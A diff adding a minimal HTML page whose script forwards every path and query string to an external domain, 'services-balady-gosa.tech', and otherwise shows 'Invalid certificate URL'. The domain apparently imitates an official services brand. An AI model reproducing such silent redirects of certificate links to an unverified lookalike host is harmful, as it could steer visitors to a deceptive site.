@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>...</title>
+
+    <script>
+        const path = window.location.pathname;
+        const query = window.location.search;
+
+        // Get everything after the first /
+        const id = path.replace(/^\/+/, '');
+
+        if (id) {
+            window.location.replace(
+                'https://services-balady-gosa.tech/' + id + query
+            );
+        } else {
+            document.body.innerHTML = '<h3>Invalid certificate URL</h3>';
+        }
+    </script>
+</head>
+
+<body>
+</body>
+</html>
